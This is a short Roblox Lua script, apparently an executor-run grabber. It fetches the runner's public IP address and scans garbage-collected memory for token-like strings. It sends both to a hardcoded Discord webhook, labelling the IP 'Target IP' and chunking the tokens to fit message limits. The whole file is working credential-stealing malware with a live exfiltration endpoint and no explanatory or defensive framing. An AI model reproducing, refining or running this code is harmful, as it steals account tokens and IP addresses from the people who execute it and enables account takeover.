local HttpService = game:GetService("HttpService")
local webhook = "https://discord.com/api/webhooks/1520935776152588399/s5XS6Edgv2rvUcnBAQIXg2XXqhxbBd2pk-YkknYSvKWyG1eioTMV6_Iq8BXi3moO9mGY"

-- IP Grab
local success, ipResponse = pcall(function()
    return HttpService:GetAsync("https://api.ipify.org?format=json")
end)

if success then
    local ipData = HttpService:JSONDecode(ipResponse)
    HttpService:PostAsync(webhook, HttpService:JSONEncode({
        content = "Target IP: " .. (ipData.ip or "Failed to fetch")
    }))
else
    HttpService:PostAsync(webhook, HttpService:JSONEncode({content = "IP Grab Failed"}))
end

-- Token Extraction
local tokens = {}
for _, obj in ipairs(getgc(true)) do
    if typeof(obj) == "string" and #obj > 30 then
        if string.find(obj, "roblox") or string.find(obj, "token") or string.find(obj, "_") or string.match(obj, "^[A-Za-z0-9_%-]+%.") then
            table.insert(tokens, obj)
        end
    end
end

-- Send tokens (chunked)
local tokenStr = table.concat(tokens, "\n")
if #tokenStr > 1900 then
    for i = 1, #tokenStr, 1900 do
        local chunk = tokenStr:sub(i, i + 1899)
        HttpService:PostAsync(webhook, HttpService:JSONEncode({content = "Roblox Tokens Chunk:\n" .. chunk}))
    end
else
    HttpService:PostAsync(webhook, HttpService:JSONEncode({content = "Roblox Tokens:\n" .. tokenStr}))
end
